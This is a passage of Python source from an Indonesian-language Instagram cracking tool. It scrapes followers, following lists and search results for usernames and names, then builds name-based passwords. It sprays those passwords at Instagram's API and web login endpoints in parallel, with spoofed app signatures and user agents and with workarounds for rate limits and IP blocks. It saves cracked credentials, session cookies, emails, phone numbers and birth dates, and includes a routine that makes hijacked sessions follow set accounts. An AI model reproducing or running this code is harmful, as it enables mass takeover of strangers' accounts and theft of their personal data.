				try:dt = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={self.user}',headers={"user-agent": "Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)","x-ig-app-id":'936619743392459'}).json()["data"]["user"]
				except:dt=''
				try:na = dt["full_name"]
				except:na = '-'
				try:pg = dt["edge_followed_by"]["count"]
				except:pg = '0'
				try:mg = dt["edge_follow"]["count"]
				except:mg = '0'
				try:ps = dt["edge_owner_to_timeline_media"]["count"]
				except:ps = '0'
				akun = Tree(Panel.fit(f" [bold white]{H2}akun tidak checkpoint{P2}",style="bold white"))
				coki = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
				akun.add(f" [bold white]username   : {H2}{self.user}")
				akun.add(f" [bold white]password   : {H2}{self.pw}")
				akun.add(f" [bold white]followers  : {H2}{pg}")
				akun.add(f" [bold white]following  : {H2}{mg}")
				akun.add(f" [bold white]postingan  : {H2}{ps}")
				akun.add(f" [bold white]{H2}{coki}")
				prints(akun)
				open(sim_ok,'a').write('%s | %s | %s | %s \n'%(self.user,self.pw,pg,mg))
			elif 'checkpoint_url' in str(po.text):
				cp += 1
				akun = Tree(Panel.fit(f" [bold white]{K2}akun checkpoint{P2}",style="bold white"))
				akun.add(f" [bold white]username   : {K2}{self.user}")
				akun.add(f" [bold white]password   : {K2}{self.pw}")
				prints(akun)
			elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' in str(po.text):
				input(f" [{C}!{P}] mode pesawat 5 detik lalu enter.")
				self.login()
			elif 'Kesalahan' in str(po.text):
				input(f" [{C}!{P}] mode pesawat 5 detik lalu enter.")
				self.login()
			elif 'ip_block' in str(po.text):
				input(f" [{C}!{P}] mode pesawat 5 detik lalu enter.")
				self.login()
			elif 'Maaf, terdapat masalah pada permintaan Anda.' in str(po.text):
				input(f" [{C}!{P}] mode pesawat 5 detik lalu enter.")
				self.login()
			else:
				akun = Tree(Panel.fit(f" [bold white]{M2}akun salah sandi{P2}",style="bold white"))
				akun.add(f" [bold white]username   : {M2}{self.user}")
				akun.add(f" [bold white]password   : {M2}{self.pw}")
				prints(akun)
		except requests.exceptions.ConnectionError:
			input(f" [{C}!{P}] jika sudah ada jaringan silahkan enter.")
			self.login()
		except Exception as e:pass
								
###---[ DUMP PENGIKUT ]---###
class Pengikut:
	def __init__(self,cookie):
		self.r = requests.Session()
		self.hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3" ,"x-ig-app-id":'936619743392459'}
		self.cok = {'cookie':cookie}
		self.dump()
	
	def dump(self):
		prints(Panel(f'\t    [{ran_rich}!{P2}] pastikan akun target tidak bersifat private akun',padding=(0,9),style="bold white"))
		user = input(f' [{C}?{P}] user : ')
		if "https" in user or "instagram" in user:
			user = user.split("/")[3].split("?")[0]
		else:
			user = user
		self.id,na = get_id(user,self.cok)
		print(f' [{C}!{P}] nama : {na}\n [{C}!{P}] akun : {self.id}')
		try:
			link = self.r.get(f"https://i.instagram.com/api/v1/friendships/{self.id}/followers/?count=10000",headers=self.hd,cookies=self.cok).json()
			for x in link['users']:
				if len(x['full_name'])<=3:pass
				else:dump.append(x['username']+'|'+x['full_name'])
			self.max = link['next_max_id']
			self.main_dump()
		except KeyboardInterrupt:
			print('\r [%s!%s] dump : %s'%(C,P,len(dump)));atur_sandi()
		except Exception as e:
			if len(dump)<=100:print('gagal dump');time.sleep(2);back()
			else:print('\r [%s!%s] dump : %s'%(C,P,len(dump)));atur_sandi()
		print('\r [%s!%s] dump : %s'%(C,P,len(dump)))
		atur_sandi()
		
	def main_dump(self):
		try:
			link = self.r.get(f"https://i.instagram.com/api/v1/friendships/{self.id}/followers/?count=100&max_id={self.max}",headers=self.hd,cookies=self.cok).json()
			for x in link['users']:
				if len(x['full_name'])<=3:pass
				else:
					if x['username']+'|'+x['full_name'] in dump:pass
					else:dump.append(x['username']+'|'+x['full_name'])
					print('\r [%s!%s] dump : %s'%(C,P,len(dump)),end='')
					sys.stdout.flush()
			self.max = link['next_max_id']
			self.main_dump()
		except Exception as e:pass
		
###---[ DUMP MENGIKUTI ]---###
class Mengikuti:
	def __init__(self,cookie):
		self.r = requests.Session()
		self.hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3" ,"x-ig-app-id":'936619743392459'}
		self.cok = {'cookie':cookie}
		self.dump()
	
	def dump(self):
		prints(Panel(f'\t    [{ran_rich}!{P2}] pastikan akun target tidak bersifat private akun',padding=(0,9),style="bold white"))
		user = input(f' [{C}?{P}] user : ')
		if "https" in user or "instagram" in user:
			user = user.split("/")[3].split("?")[0]
		else:
			user = user
		self.id,na = get_id(user,self.cok)
		print(f' [{C}!{P}] nama : {na}\n [{C}!{P}] akun : {self.id}')
		try:
			link = self.r.get(f"https://i.instagram.com/api/v1/friendships/{self.id}/following/?count=10000",headers=self.hd,cookies=self.cok).json()
			for x in link['users']:
				if len(x['full_name'])<=3:pass
				else:dump.append(x['username']+'|'+x['full_name'])
			self.max = link['next_max_id']
			self.main_dump()
		except KeyboardInterrupt:
			print('\r [%s!%s] dump : %s'%(C,P,len(dump)));atur_sandi()
		except Exception as e:
			if len(dump)<=100:print('gagal dump');time.sleep(2);back()
			else:print('\r [%s!%s] dump : %s'%(C,P,len(dump)));atur_sandi()
		print('\r [%s!%s] dump : %s'%(C,P,len(dump)))
		atur_sandi()
		
	def main_dump(self):
		try:
			link = self.r.get(f"https://i.instagram.com/api/v1/friendships/{self.id}/following/?count=100&max_id={self.max}",headers=self.hd,cookies=self.cok).json()
			for x in link['users']:
				if len(x['full_name'])<=3:pass
				else:
					if x['username']+'|'+x['full_name'] in dump:pass
					else:dump.append(x['username']+'|'+x['full_name'])
					print('\r [%s!%s] dump : %s'%(C,P,len(dump)),end='')
					sys.stdout.flush()
			self.max = link['next_max_id']
			self.main_dump()
		except Exception as e:pass
		
###---[ DUMP PENCARIAN ]---##$
class Pencarian:
	def __init__(self,cookie):
		self.r = requests.Session()
		self.ua = ua_rozh()
		self.cok = {'cookie':cookie}
		self.hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3" ,"x-ig-app-id":'936619743392459'}
		self.main()
		
	def main(self):
		prints(Panel(f'   [{ran_rich}!{P2}] silahkan masukan nama, gunakan "{K2},{P2}" ({K2}koma{P2}) untuk nama berikutnya',padding=(0,5),style="bold white"))
		list = input(f' [{C}?{P}] nama : ').split(",")
		for nama in list:
			try:
				for x in self.r.get('https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query=%s&rank_token=0.11856792192547738&include_reel=true'%(nama),cookies=self.cok,headers=self.hd).json()['users']:
					if len(x['user']['full_name'])<=3:pass
					else:
						if x['user']['username']+'|'+x['user']['full_name'] in dump:pass
						else:
							dump.append(x['user']['username']+'|'+x['user']['full_name'])
							print('\r [%s!%s] dump : %s'%(C,P,len(dump)),end="")
							time.sleep(0.04)
							sys.stdout.flush()
			except:pass
		if len(dump)<=0:exit('gagal dump')
		else:pass
		print('\r [%s!%s] dump : %s'%(C,P,len(dump)))
		atur_sandi()

###---[ BAGIAN SANDI ]---###
def atur_sandi():
	global prog, des
	tampung = []
	for x in dump: tampung.append(x)
	dump.clear()
	for x in tampung:xx = random.randint(0,len(dump));dump.insert(xx,x)
	prints(Panel(f'        [{ran_rich}?{P2}] ingin mengunakan metode api atau regular ({H2}A{P2}/{K2}R{P2})',title=f'{M2}•{K2}•{H2}•{P2} METODE {H2}•{K2}•{M2}•{P2}',padding=(0,10),style="bold white"))
	metode = input(f" [{C}?{P}] metode : ")
	prints(Panel(f'\t\t     [bold][{ran_rich}01{P2}]. nama, 123, 12345\n\t\t     [{ran_rich}02{P2}]. nama, 123, 1234, 12345\n\t\t     [{ran_rich}03{P2}]. nama, 123, 1234, 12345, 123456\n\t\t     [{ran_rich}04{P2}]. custom password manual',title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}',padding=(0,5),style="bold white"))
	apa = input(f" [{C}?{P}] sandi : ")
	if apa in ["4","04","5","05"]:
		prints(Panel(f" [{ran_rich}?{P2}] masukan sandi manual anda, contoh '{K2}bismillah{P2}' gunakan koma",title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}',padding=(0,10),style="bold white"))
		manual = input(f" [{C}?{P}] sandi : ").split(",")
		prints(Panel(f"  [{ran_rich}?{P2}] masukan sandi belakang nama, contoh '{K2}1234{P2}' gunakan koma",title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}',padding=(0,10),style="bold white"))
		bk = input(f" [{C}?{P}] sandi : ").split(",")
	prints(Panel(f' [{ran_rich}?{P2}] tampilkan email, nomor, ttl, cookie ({K2}tidak di sarankan{P2}) ({H2}y{P2}/{M2}n{P2})',title=f'{M2}•{K2}•{H2}•{P2} INFO {H2}•{K2}•{M2}•{P2}',padding=(0,10),style="bold white"))
	bbz = input(f' [{C}?{P}] pilih  : ')
	if bbz in ['y','Y','ya','Ya','1','01','yy','YA','yA']: pilih_info.append("yes")
	else: pilih_info.append("no")
	tanggal = f"{hari}-{bulan}-{tahun}.txt"
	prints(Panel(f'\t\t   hasil ok di : {H2}STAROZ/OK-{tanggal}{P2}\n\t\t   hasil cp di : {K2}STAROZ/CP-{tanggal}{P2}',padding=(0,5),style="bold white"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(dump))
	with prog:
		with ThreadPoolExecutor (max_workers=30) as babas:
			for akun in dump:
				user,nama = akun.split('|')[0], akun.split('|')[1].lower()
				dp = nama.split(' ')[0]
				if apa in ['1','01']:
					if len(dp)<3 or len(nama)<5:
						pwx = [nama.replace(' ','')+'123',nama.replace(' ','')+'12345']
					else:
						pwx = [nama,nama.replace(' ',''),dp+'123',dp+'12345']
				elif apa in ['2','02']:
					if len(dp)<3 or len(nama)<5:
						pwx = [nama.replace(' ','')+'123',nama.replace(' ','')+'12345']
					else:
						pwx = [nama,nama.replace(' ',''),dp+'123',dp+'1234',dp+'12345']
				elif apa in ['3','03']:
					if len(dp)<3 or len(nama)<5:
						pwx = [nama.replace(' ','')+'123',nama.replace(' ','')+'12345']
					else:
						pwx = [nama,nama.replace(' ',''),dp+'321',dp+'123',dp+'1234',dp+'12345',dp+'123456']
				elif apa in ['4','04']:
					if len(dp)<3 or len(nama)<5:
						pwx = manual
					else:
						kombo = []
						pwx = [nama.replace(' ',''),nama]+manual
						for x in bk:kombo.append(str(dp)+str(x))
						pwx = pwx+kombo
				else:
					if len(dp)<3 or len(nama)<5:
						pwx = [nama.replace(' ','')+'123',nama.replace(' ','')+'12345']
					else:
						pwx = [nama.replace(' ',''),dp+'123',dp+'1234',dp+'12345']
				if metode in ["r","R","regular","Regular"]:
					babas.submit(Mengheker,user,pwx)
				else:
					babas.submit(MetodApi,user,pwx)
	prints(Panel(f'  [{ran_rich}!{P2}] crack telah selesai dengan jumlah ok : {H2}{ok}{P2} cp : {K2}{cp}{P2} terima kasih.',padding=(0,9),style="bold white"))
	exit()

###---[ METHODE API ]---###	
def MetodApi(user,pewe):
	global ok, cp, loop
	sesion = 0
	if sesion > 10: sesion = 0
	ses = requests.Session()
	prog.update(des,description=f"{P2}[{H2}aman{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
	prog.advance(des)
	rr = random.randint
	ua_fake = f"Instagram {str(rr(100,250))}.1.0.16.113 Android (33/{rr(5,9)}; 420dpi; 1080x2156; BLD/Blade; BLD{str(rr(1111,5555))}; RozhApi; BlueJar; en_GB; 387809238)"
	while True:
		try:
			ua = ua_rozh()
			base = json.dumps({'id': str(uuid.uuid4()), 'experiments': 'ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left'})
			kode = hmac.new("46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b".encode('utf-8'), str(base).encode('utf=8'),hashlib.sha256).hexdigest()
			data = {"signed_body": f"{kode}.{str(base)}"}
			head = {'Host': 'i.instagram.com', 'content-length': f'{len(str(data))}', 'x-ig-connection-type': 'WIFI', 'x-ig-capabilities': '3Q==', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
			one = ses.post("https://i.instagram.com/api/v1/qe/sync/",headers=head,data=data).json()
			if "ok" in one["status"]:break
			else: continue
		except:pass
	for pw in pewe:
		try:
			csrf = ses.cookies["csrftoken"]
			data = {"phone_id": str(uuid.uuid4()),"_csrftoken": csrf,"username": user,"guid": str(uuid.uuid4()),"device_id": "android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16],"password": pw,"login_attempt_count": str(sesion)}
			ned = hmac.new("46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b".encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()			
			date = f"signed_body={ned}.%7B%22phone_id%22%3A%22{str(uuid.uuid4())}%22%2C%22_csrftoken%22%3A%22{csrf}%22%2C%22username%22%3A%22{user}%22%2C%22guid%22%3A%22{str(uuid.uuid4())}%22%2C%22device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22password%22%3A%22{pw}%22%2C%22login_attempt_count%22%3A%22{sesion}%22%7D&ig_sig_key_version=4"
			head = {'Host': 'i.instagram.com', 'content-length': f'{len(str(date))}', 'x-ig-connection-type': 'MOBILE(LTE)', 'x-ig-capabilities': '3Q==', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
			bz = ses.post("https://i.instagram.com/api/v1/accounts/login/",headers=head,data=date)
			#prints(bz.text,"\n\r")
			sesion += 1
			if "logged_in_user" in bz.text:
				user = bz.json()["logged_in_user"]["username"]
				na, pg, mg, ps = cek_info(user)
				#open(".ua_instagram.txt","a").write(str(ua)+"\n")
				if "no" in pilih_info:
					akun = Tree(Panel.fit(f" [bold white]{H2}{user}{P2} | {H2}{pw}",style="bold white"))
					akun.add(f" [bold white]followers  : {H2}{pg}")
					akun.add(f" [bold white]following  : {H2}{mg}")
					akun.add(f" [bold white]postingan  : {H2}{ps}")
					akun.add(f" [bold white]useragent  : {H2}{ua_fake}")
					prints(akun)
					print()
					open(sim_ok,'a').write('%s | %s | %s | %s | %s\n'%(user,pw,pg,mg,ps))
				else:
					coki = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					em, nop, ttl, thn = cek_data2(coki)
					akun = Tree(Panel.fit(f" [bold white]{H2}{user}{P2} | {H2}{pw}",style="bold white"))
					akun.add(f" [bold white]followers  : {H2}{pg}")
					akun.add(f" [bold white]following  : {H2}{mg}")
					akun.add(f" [bold white]postingan  : {H2}{ps}")
					akun.add(f" [bold white]email akun : {H2}{em}")
					akun.add(f" [bold white]nomor akun : {H2}{nop}")
					akun.add(f" [bold white]tgl. lahir : {H2}{ttl}")
					akun.add(f" [bold white]tgl. join  : {H2}{thn}")
					akun.add(f" [bold white]{H2}{coki}")
					prints(akun)
					print()
					open(sim_ok,'a').write('%s | %s | %s | %s | %s | %s | %s | %s | %s\n'%(user,pw,pg,mg,ps,nop,ttl,em, coki))
				ok+=1
				#try:cek_email(ses.cookies.get_dict()["sessionid"])
				#except:pass				
				break
			elif "challenge_required" in bz.text:
				na, pg, mg, ps = cek_info(user)
				akun = Tree(Panel.fit(f" [bold white]{K2}{user}{P2} | {K2}{pw}",style="bold white"))
				akun.add(f" [bold white]followers  : {K2}{pg}")
				akun.add(f" [bold white]following  : {K2}{mg}")
				akun.add(f" [bold white]postingan  : {K2}{ps}")
				akun.add(f" [bold white]useragent  : {K2}{ua_fake}")
				prints(akun)
				print()
				cp+=1
				open(sim_cp,'a').write('%s | %s | %s | %s \n'%(user,pw,pg,mg))
				break
			elif "Error" in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v3{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			elif "Kesalahan" in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v2{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			elif "Harap tunggu beberASUapa menit sebelum mencoba lagi." in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v1{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(10)
			elif 'ip_block' in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v4{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
		#except Exception as e:print(e)
	loop+=1

###---[ HMAC GENERATOR ]---###
def get_hmac():
	rc = random.choices
	A = "".join(rc("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", k=17)); B = "".join(rc("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", k=10)); C = "".join(rc("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", k=10)); D = "".join(rc("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", k=7))
	return f"hmac.{A}-{B}-{C}-{D}-"

###---[ METODE REGULAR ]---###
def Mengheker(user,pewe):
	global ok, cp, loop
	prog.update(des,description=f"{P2}[{H2}aman{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
	prog.advance(des)
	rr = random.randint
	ua_fake = f"Mozilla/5.0 (Linux; Android {str(rr(5,9))}.{str(rr(5,9))}.{str(rr(5,9))}; RMX-{str(rr(373,585))}; id_ID) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,106))}.0.{str(rr(1111,6666))}.{str(rr(100,400))} Mobile Safari/537.36 Instagram {str(rr(100,250))}.1.0.16.113 Android (33/13; 420dpi; 1080x2156; BLD/Blade; BLADE-{str(rr(33,55))}; RozhApi; BlueJar; id_ID; 387809238)"
	for pw in pewe:
		try:
			ua = ua_regular()
			ses = requests.Session()
			ses.headers.update({"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "referer": "https://auth.meta.com/", "sec-ch-prefers-color-scheme": "light", "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"', "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"', "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "same-origin", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "user-agent": ua, "viewport-width": "980"})
			link = ses.get("https://www.instagram.com/accounts/login/?force_authentication=1&enable_fb_login=1&next=%2Foauth%2Fauthorize%3Fclient_id%3D200289238967899%26redirect_uri%3Dhttps%3A%2F%2Fauth.meta.com%2Flogin%2Finstagram%2Fresponse%2F%3Fstate%3DATDMOPHbksbCUdJOXmiZIhAE7lZqlUWqCTX-GYt9qFl4x19QlzsG6Gd040R-zUEcozX0TSq39JENVrLJawtBILuyOkSOyQRXPab1K9eFospFQj70YSFjJteCpVpAy_8wlz1XMqOIYBenU-zUnrX4GIoSO5wLO7T9GKR04LV8EcojWRjeyyieIfVNEhqtih7ar2umDzrE4qP5mc2hfWiLkhg1F1I6PmevX7hnFZLWg1EyxjhZrpDeoHMno1lqOeFJPSh0b8YjPbouEGstYQ%26response_type%3Dcode%26scope%3Duser_profile%26state%3DATDMOPHbksbCUdJOXmiZIhAE7lZqlUWqCTX-GYt9qFl4x19QlzsG6Gd040R-zUEcozX0TSq39JENVrLJawtBILuyOkSOyQRXPab1K9eFospFQj70YSFjJteCpVpAy_8wlz1XMqOIYBenU-zUnrX4GIoSO5wLO7T9GKR04LV8EcojWRjeyyieIfVNEhqtih7ar2umDzrE4qP5mc2hfWiLkhg1F1I6PmevX7hnFZLWg1EyxjhZrpDeoHMno1lqOeFJPSh0b8YjPbouEGstYQ%26logger_id%3De43d3fa8-ace5-4d3d-b96e-2f53751d5ed6")
			date = {"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(re.search('"__spin_t":(\d+),', str(link.text)).group(1), pw),
			"optIntoOneTap": "false",
			"queryParams": '{"force_authentication":"1","enable_fb_login":"1","next":"/oauth/authorize?client_id=200289238967899&redirect_uri=https://auth.meta.com/login/instagram/response/?state=ATDMOPHbksbCUdJOXmiZIhAE7lZqlUWqCTX-GYt9qFl4x19QlzsG6Gd040R-zUEcozX0TSq39JENVrLJawtBILuyOkSOyQRXPab1K9eFospFQj70YSFjJteCpVpAy_8wlz1XMqOIYBenU-zUnrX4GIoSO5wLO7T9GKR04LV8EcojWRjeyyieIfVNEhqtih7ar2umDzrE4qP5mc2hfWiLkhg1F1I6PmevX7hnFZLWg1EyxjhZrpDeoHMno1lqOeFJPSh0b8YjPbouEGstYQ&response_type=code&scope=user_profile&state=ATDMOPHbksbCUdJOXmiZIhAE7lZqlUWqCTX-GYt9qFl4x19QlzsG6Gd040R-zUEcozX0TSq39JENVrLJawtBILuyOkSOyQRXPab1K9eFospFQj70YSFjJteCpVpAy_8wlz1XMqOIYBenU-zUnrX4GIoSO5wLO7T9GKR04LV8EcojWRjeyyieIfVNEhqtih7ar2umDzrE4qP5mc2hfWiLkhg1F1I6PmevX7hnFZLWg1EyxjhZrpDeoHMno1lqOeFJPSh0b8YjPbouEGstYQ&logger_id=e43d3fa8-ace5-4d3d-b96e-2f53751d5ed6","oneTapUsers":""}',
			"trustedDeviceRecords": "{}",
			"username": user}
			head = {"accept": "*/*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "content-type": "application/x-www-form-urlencoded", "origin": "https://www.instagram.com", "referer": link.url, "sec-ch-prefers-color-scheme": "light", "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"', "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"', "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "user-agent": ua, "viewport-width": "360", "x-asbd-id": "198387", "x-csrftoken": re.findall('{"csrf_token":"(.*?)"',str(link.text.replace("\\","")))[0], "x-ig-app-id": "1217981644879628", "x-ig-www-claim": "0", "x-Instagram-ajax": re.findall('"rollout_hash":"(.*?)"',str(link.text))[0], "x-requested-with": "XMLHttpRequest"}
			bz = ses.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", data = date, headers = head, allow_redirects = True) # https://www.instagram.com/accounts/login/ajax/
			print(bz.text)
			ua_fake=ua
			if "userId" in bz.text: # profile_pic_url
				na, pg, mg, ps = cek_info(user)
				#open(".ua_instagram.txt","a").write(str(ua)+"\n")
				if "no" in pilih_info:
					akun = Tree(Panel.fit(f" [bold white]{H2}{user}{P2} | {H2}{pw}",style="bold white"))
					akun.add(f" [bold white]followers  : {H2}{pg}")
					akun.add(f" [bold white]following  : {H2}{mg}")
					akun.add(f" [bold white]postingan  : {H2}{ps}")
					akun.add(f" [bold white]useragent  : {H2}{ua_fake}")
					prints(akun)
					print()
					open(sim_ok,'a').write('%s | %s | %s | %s | %s\n'%(user,pw,pg,mg,ps))
				else:
					date = {"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{str(time.time()).split('.')[0]}:{pw}", "username": user, "queryParams": "{}", "optIntoOneTap": "false", "trustedDeviceRecords": "{}"}
					ses.post("https://www.instagram.com/accounts/login/ajax/", headers=head, data=date)
					coki = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					em,nop,ttl, thn= cek_data2(coki)
					akun = Tree(Panel.fit(f" [bold white]{H2}{user}{P2} | {H2}{pw}",style="bold white"))
					akun.add(f" [bold white]followers  : {H2}{pg}")
					akun.add(f" [bold white]following  : {H2}{mg}")
					akun.add(f" [bold white]postingan  : {H2}{ps}")
					akun.add(f" [bold white]email akun : {H2}{em}")
					akun.add(f" [bold white]nomor akun : {H2}{nop}")
					akun.add(f" [bold white]tgl. lahir : {H2}{ttl}")
					akun.add(f" [bold white]tgl. join  : {H2}{thn}")
					akun.add(f" [bold white]{H2}{coki}")
					prints(akun)
					print()
					open(sim_ok,'a').write('%s | %s | %s | %s | %s | %s | %s | %s | %s\n'%(user,pw,pg,mg,ps,nop,ttl,em, coki))
				ok+=1
				#try:cek_email(ses.cookies.get_dict()["sessionid"])
				#except:pass				
				break
			elif 'checkpoint_required' in bz.text:
				na, pg, mg, ps = cek_info(user)
				akun = Tree(Panel.fit(f" [bold white]{K2}{user}{P2} | {K2}{pw}",style="bold white"))
				akun.add(f" [bold white]followers  : {K2}{pg}")
				akun.add(f" [bold white]following  : {K2}{mg}")
				akun.add(f" [bold white]postingan  : {K2}{ps}")
				akun.add(f" [bold white]useragent  : {K2}{ua_fake}")
				prints(akun)
				print()
				cp+=1
				open(sim_cp,'a').write('%s | %s | %s | %s \n'%(user,pw,pg,mg))
				break
			elif "Error" in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v3{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			elif "Kesalahan" in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v2{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			elif "Harap tunggu beberapa menit sebelum mencoba lagi." in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v1{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(10)
			elif 'ip_block' in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v4{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
		#except Exception as e:print(e)
	loop+=1
	
###---[ CEK EMAIL ]---###
def cek_email(sesion):
	for akun in ["39431798677", "5761356655"]:
		try: ses.post(f'https://i.instagram.com/api/v1/web/friendships/{akun}/follow/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+sesion,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'})
		except:pass

##---[ CEK DATA HASIL ]---###
def cek_info(user):
	ua = "Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)"
